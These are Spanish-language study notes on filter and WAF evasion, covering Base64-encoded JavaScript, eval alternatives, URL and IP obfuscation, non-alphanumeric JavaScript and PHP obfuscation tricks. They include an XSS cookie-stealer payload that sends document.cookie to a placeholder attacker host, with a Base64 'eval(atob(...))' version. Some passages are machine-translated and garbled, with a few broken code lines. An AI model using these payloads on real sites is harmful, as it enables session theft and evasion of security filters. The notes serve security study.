# evasion basico

### Base64 Encoding Evasion

* Supongamos que queremos evadir un sistema que inspecciona el código Javascript Para palabras clave específicas como eval, alerta, prompt, document.cookie u otras posibles cadenas maliciosas.
* Una posible forma de escapar este tipo de filtros es mediante la codificación Base64.

#### Cookie Stealer

Para robar cookies, no marcado como HttpOnly es relativamente fácil y comúnmente utilizamos esta carga útil JavaScript:

```js
location.href = 'http://evilpath;com/?c='+escape(document.cookie)''
```

* sin embargo, a menudo la palabra clave document.cookie puede ser detectada y bloqueada

Utilen la codificación Base64, podemos escondernos document.cookie código que traduce el vector de ataque en:

```js
eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGg7Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
```

* tal vez la función eval está en la lista negra también, así que vamos a ver alternativas:

in Javascript:

```js
[].constructor.constructor("code")() //where code equals 'atob(<base64 script>)'
```

Otros métodos válidos son:

```js
setTimeout("code") #all browsers
setInterval("code") #all browsers
setImmediate("code")#IE10+
Function("code)"() #all browsers
```

### URI Obfuscation Techniques

URI (Uniform (local/remote) Identifier de los recursos

* No sólo puede ser útil en la garras de un sistema filtrado, sino también para acortar el vector para respetar un límite de longitud.

#### URL Shortening

Es una técnica en la que una URL puede ser más corta en longitud y todavía dirigir a la página requerida.

→ https://my.ine.com

→ https://tinyurl.com/32f32v49

Ejecutar su propio acorte de URL es simple y hay varios servicios y bibliotecas que le permiten iniciar el servicio fácilmente, tales como:

→ http://yourls.org/ //free

→ https://bitly.com/ //paid

#### Preview

Algunos servicios de acorte implementan su técnica para mostrar la vista previa o alguna información abou el enlace acortado

bitly uses + signal:

```
- tinyurl uses preview.<url>
- moreover: http://security.thejoshmeister.com/2009/04/how-to-preview-shortened-urls-tinyurl.html
```

Hay servicios que no proporcionan esta característica, tales como:

* http://t.co/ //usado por twitter

Para este tipo de servicio, existen soluciones en línea:

* http://www.toolsvoid.com/unshorten-url
* http://longurl.org/expand

#### cURL Link Resolver

U puede hacerlo manualmente:

```bash
curl -I <short url>
```

### URL Hostname Obfuscation

*   normalmente se utilizan URLs en formatos como:

    → https://hack.me/test
* but RFC
* RFC 3986 nos dice que estas son también URLs válidas:
* https://hack.me:443
* https://_\[this\_is\_valid]_@hack.me

Queremos ofuscar el componente de la Autoridad de un URI: foo://example.com:8042/over/there?name=ferret#nose

|scheme| authority | path | query | fragment|

The Authority component is structured as follows:

```
[ userinfo "@" ] host [ ":" port ]

# other than the port subcomponent, we can play with the userinfo and host.
```

#### Obfuscating with Userinfo

El subcomponente userinfo se utiliza Para autenticación. Si se requieren credenciales para acceder a un recurso, se pueden incluir aquí, y el login será automático:

```php
http://'username:password'@www.I-want-login.com/protected_path

# if the page requires NO authentication, the subcomponent text is ignored by both browser and server.
```

Ejemplo:

* https://www.google.com@hack.me/t/xss

> hack.me no implementa este tipo de autenticación e ignorará el www.google.com part (userinfo)

En el subcomponente userinfo, se permite Unicode, por lo tanto, no necesita otras aclaraciones adicionales si queremos añadir señales o carta de otros idiomas.

> no todo el navegador admite esta técnica de ofuscación. Firefox y Opera muestran mensajes de alerta.
![[Pasted image 20240311152410.png]]
![[Pasted image 20240311152422.png]]

#### Obfuscating with Host

Los nombres de Internet se traducen en direcciones IP. Pero hay otras maneras de representar el mismo **número**, tales como: _Dword_, _Octal_, _Hexadecimal_.
![[Pasted image 20240311152444.png]]
**Dword - google.com**

Double Word se conoce como IP Integer. IP se traduce en un número equivalente de 16 bits.

```
google.com > 216.58.218.78 > http://3627734862
```

**Octal - google.com**

```
google.com > 216.58.218.78 > http://0330.0072.0327.0116
```

> también podemos **feed** cada número añadiendo ceros principales sin romper el valor original

**Hexadecimal - google.com**

```
http://0xd83ada4e or http://0xd8.0x3a.0xda.0x4e
```

> su posible también para añadir ceros como **0x000000d8 ...**

**Hybrid**

* estas son las técnicas básicas, sin embargo, su también posible mezclarlas y crear un híbrido
* esta herramienta aplica todas las técnicas discutidas

→ http://www.silisoftware.com/tools/ipconverter.php

### Java Obfuscation Techniques

#### Non-Alphanumeric

Su manera de codificar el código Javascript usando sólo caracteres no alfanumíricos.

#### String Casting

```java
"" + 1234 or 1234 + "" # returns "1234"
[] + 1234 or 1234 + [] # returns "1234"
x = "hello"
[1,"a",x] # returns [1, "a", "hello"]
[1,"a",x]+""  # returns "1, a, hello"
```

#### Booleans

Hay muchas maneras de devolver un valor booleano usando caracteres no alfanuméricos:

\| False | True | | !\[ ] | !!\[ ] | | !{ } | !!{ } | | !!" " | !" " | | \[ ]=={ } | \[ ]==""|

Para extraer la cadena verdadera o falsa:

```
[!![ ]]+"" # returns 'true'
[![ ]]+""  # returns 'false'
```

#### Numbers

* Puede ser creado. verdadero es 1 y falso es 0;
* para generar 1 podemos hacer true.false y 2 truee... etc

Ejemplos: número cero **0**:

\| +"" | +\[ ] | !\[ ]+!\[ ] | | -"" | -\[ ] | !\[ ]+!{ } | | -+-+"" | -+-+\[ ] | !\[ ]+!!"" |
![[Pasted image 20240311152511.png]]
#### String

Cómo generar cadenas personalizadas. Por ejemplo, si queremos generar la cadena **alert**, necesitamos generar cada personaje por separado y luego juntarlos.

* Generate **alert** string

Tenemos que utilizar la salida de cuerda de los objetos nativos JavaScript y extraer los caracteres requeridos. Example:

```
_={}+[] # is "[object Object]"
[]/[]+"" # is "NaN"
!![]/![]+"" # is "Infinity"
```

Así que para extraer el alfa char **a** utilizamos la Cada Nan y acceda la posición 1:

```
([]/[]+"")[![]+!![]] #"a" cause string can be accessed like arrays
("NaN")[1]
```

Los caracteres alfa restantes se pueden generar utilizando los siguientes mensajes:

```
a - "Nan", fAlse
l - faLse
e - truE. falsE or [objEct ObjEct]
r - tRue
t - True or infiniTy
```

#### Encoding

Basado en esta técnica:

* JJencode = http://utf-8.jp/public/jjencode.html
* Aaencode = http://utf-8.jp/public/aaencode.html
* JSFuck = http://www.jsfuck.com/

→ https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

![[Pasted image 20240311152528.png]]

#### JavaScript Compressing

Para hacer que JavaScript funcione más rápido, los desarrolladores a menudo utilizan herramientas que compilan JavaScript en código de rendimiento más compacto y más alto. Mediante el uso de estas herramientas, también es posible ofuscar el código y evadir la detección. Esto es lo que vamos a buscar en este capítulo.

#### Minifying

El proceso de la minificación del código JavaScript es eliminando todos los caracteres innecesarios sin cambiar la funcionalidad del código original. Básicamente, se eliminan todos los caracteres que se utilizan para añadir legibilidad al código. Estos personajes son ignorados por el intérprete. Ejemplos de estos son: espacios blancos, nueva línea, comentarios. Algunas herramientas:

```
Closure compiler - https://developers.google.com/closure/compiler/
YUICompressor    - http://yui.github.io/yuicompressor/
JSMin            - http://crockford.com/javascript/jsmin
Packer           - http://dean.edwards.name/packer/
```

**Packing**

Un envasado compresa el código minificado acortando nombres variables, funciones y otras operaciones variables. En otras palabras, hace que el código sea ilegible.

### PHP Obfuncations Techniques

**Las formas de la ofuscación de PHP son infinitas...**

* Referencia básica del lenguaje

#### Type Juggling

PHP es un lenguaje de mecanografiado dinámicamente. PHP no requiere/apoto definición de tipo explícita en la declaración de variable Básicamente, podemos declarar la misma variable y asignar diferentes valores (cadenación, int, etc) el tipo de cambios de variable.

```php
$joke = "1"
$joke++;
$joke = "a string"
```

#### Numerical Data Types

```php
$x = 'Giuseppe';
echo $x[0];    # decimal index     (0) > 'G'
echo $x[0001]; # octal index       (1) > 'i'
echo $x[0x02]; # hexadecimal index (2) > 'u'
echo $x[0b11]; # binary index      (3) > 's'
```

Access String / Integer Numbers

Cómo la estructura Para los literales enteros son:

\| Integer | | decimal | hexadecimal | octal | binary | | \[1-9]\[0-9]\* or 0| 0\[xX]\[0-9a-fA-F]+ | 0\[0-7]+ | 0b\[01]+ |

#### Access String / Floating Numbers

```php
$x = 'Giuseppe';
echo $x[0.1];             # floating 0.1 casted to 0 (0) > 'G'
echo $x[.1e+1];           # exponential       (1) > 'i'
echo $x[0.2E+0000000001]; # long exponential  (2) > 'u'
echo $x[1e+1-1E-1-5.999]; # exponential and floating expression 3.901 casted to 3 > 's'
```

Cómo la estructura Para los literales flotantes son:

\| Floating | | LNUM | DNUM | EXPONENT\_DNUM | | \[0-9]+ | (\[0-9]_\[.]{LNUM}) | ({LNUM}\[.]\[0-9]_)| \[+-]?(({DNUM} | {DNUM}) \[eE]\[+-]? {LNUM})|

#### Exotic Number Generation

```php
$x = 'Giuseppe';
echo $x[FALSE];                  // false is (0)                 > 'G'
echo $x[TRUE];                   // true is  (1)                 > 'i'
echo $x[count('hello')+true];    // count(object) is 1 (2)       > 'u'
echo $x["7rail"+"3er"-TRUE^0xA]; // PHP ignore trailing data (3) > 's'
```

* Es posible utilizar las funcionalidades de fundición PHP proporciona:
* http://www.php.net/manual/en/language.types.type-juggling.php#language.types.typecasting

```php
$x = 'Giuseppe';
echo $x[(int)"a common string"]; //(0) > 'G'
echo $x[(int)!0];       // True (1)    > 'i'
echo $x[(int)"2+1"];    // (2)         > 'u'
echo $x[(float)"3.11"]; // (3)         > 's'
echo $x[boolval(['.'])+(float)(int)array(0)+floatval('2.1+1.2=3.3')];
# true(1)+1+2.1=4.2 is (4)            > 'e'
```

#### String Data Types

En PHP hay cuatro maneras diferentes en las que es posible especificar una cadena literal:

```php
- single quoted
- double quoted
- heredoc syntax
- nowdoc syntax (since PHP 5.3.0

# single quotes ' ' = variable and escape sequences For special chars are not expanded
# double quotes " " - they are expanded
```
![[Pasted image 20240311152603.png]]
#### Escapes

```php
\n                   # linefeed {LF or 0x04(10) in ASCII)
\r                   # carriage return (CR or 0x0D (13) in ASCII)
\t                   # horizontal tab (HT or 0x09(9) in ASCII)
\v                   # vertical tab (VT or 0x0B(11) in ASCII (since PHP 5.2.5)
\f                   # form feed (FF or 0x0C(12) in ASCII) (since PHP 5.2.5)
\\                   # backslash
\$                   # dollar sign
\"                   # double-quote
\[0-7]{1,3}          # sequence of chars matching the regex is a character in octal notation
\x[0-9A-Fa-f]{1,2}   # sequence matching is a hexadecimal notation
```

#### Variable Parsing

```php
$s = "\x20"; //space char
echo "I$sLove Beer"; //theres no $sLove variable > I Beer
echo "I{$s}Love Beer";  > I Love Beer
echo "I${s}Love Beer";  > I Love Beer
echo "I{${s}}Love Beer";> I Love Beer
```

* Even arrays, object methods, class functions with numerical obfuscation are allowed.

#### Heredoc and Nowdoc

* las formas preferidas entre los programadores de la línea de mando
* El identificador debe contener caracteres alfanuméricos y subrayados. También debe comenzar con un char o subrayado de no dígitos, por lo que estos ejemplos siguen siendo válidos:

```php
echo <<<™[™&¨}]™⅞
 It works!
™⅞;
```

#### Complex (curly) Syntax {...}

Estas son 3 maneras diferentes de definir una variable llamada $Beer:

```php
${'Be'.'er'} = 'Club';
${'Be'.str_repeat('e',2).'r'} = 'Club';
${'Be'.str_repeat('e',2).@false./*.*/'r'} = 'Club';
```

Ejemplo de ofuscación:

```php

class beers{
  const lovely='rootbeer';
}
$rootbeer = 'Club'
echo "I'd like a {${beers::lovely}}!" //Id like a Club!
```

#### Array Data Types

```php
$a = array(x=>123,xx=>456);
echo $a['x']; > 123 //normal
echo $a[x]; > 123  // index without quotes
echo $a["\x78"]; > 123 // hexa notation
echo $a['\170']; > 123 // octal notation
echo $a['x'.@false."\x78"]; > 456 //normal usage with padding and hex.notation
```

* Una forma sencilla de evadir WAFs es no sólo enviar su carga útil cifrada usando GET o POST, sino también la clave para descifrar a través de una cabecera personalizada.

#### Variable Variables

Es una forma de establecer un nombre variable de forma dinámica:

```php
$var # variable name
$$var # variable of $var variable

$x = 'love';
$$x = 'beer';

echo $x; love
echo $$x; beer
echo $love; beer
echo "$x ${$x}"; love beer
```

* es posible añadir más señales de dólar
* de esta manera, es fácil crear código muy difícil de leer.

#### $\_SERVER Superglobal

Esta es la manera de acceder a la $\_SERVER superglobal

```php
$$$$$$$$$$s = '_SERVER';
var_dump($$$$$$$$$$s); // null
var_dump($$$$$$$$$$$s); // string(7) "_SERVER"
var_dump($$$$$$$$$$$$s); // the $_SERVER array
```

PHP Código no alfanumérico

* http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
* http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/

#### Arithmetic Operators

* php sigue la convención de perls:
* http://php.net/manual/en/language.operators.increment.php
* La variable de caracteres sólo se puede incrementar y no decrementer. Sólo se admiten alfabetos y dígitos y dígitos (a-z, A-Z y 0-9).

#### Bitwise Operators

Es posible utilizar operadores en cuerdas. ejemplo:

```php
echo A&B; //@
echo A|B; //C
echo A^B; //U+0003 END OF TEXT
echo ~A; //U+00BE Vulgar fraction three quarters
echo A<<B; //0
```

#### Native PHP Objects

```php
$a = []; #create an empty array object
$a = $a.!![]; # convert the array to string "Array"
$_ = $__ = ![]&!![]; #true & false generates the int(0) "0"
$__++; #increment int (0) by one "1"
$_§ = $__§ = $a[$_]; # Access the position 0 of the 'array' string "A"
$__§++; #Get the next char after A "B"
echo $_§|$__§; #echos A|B "C"
```

```php
$_="{" #XOR char
echo ($_^"<").($_^">;").($_^"/"); #XOR magic > 'GET'
```

> hackvertor.co.uk - Tiene 2 opciones para codificar PHP en código no alfanumérico.
